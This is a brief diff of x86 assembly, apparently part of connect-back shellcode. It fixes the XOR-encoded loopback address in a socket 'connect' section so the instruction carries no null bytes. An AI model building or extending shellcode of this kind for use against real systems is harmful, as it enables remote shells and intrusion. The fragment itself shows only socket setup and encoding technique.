@@ -38,7 +38,7 @@ _start:
 ; connect
 
 	pop ebx				; ebx = AF_INET
-	mov ecx, 0x1000007f	; 127.0.0.1 xored with 0xffffffff in network-byte order
+	mov ecx, 0xfeffff80	; 127.0.0.1 xored with 0xffffffff in network-byte order
 	xor ecx, 0xffffffff
 	mov dl, 0x10
 	push ecx
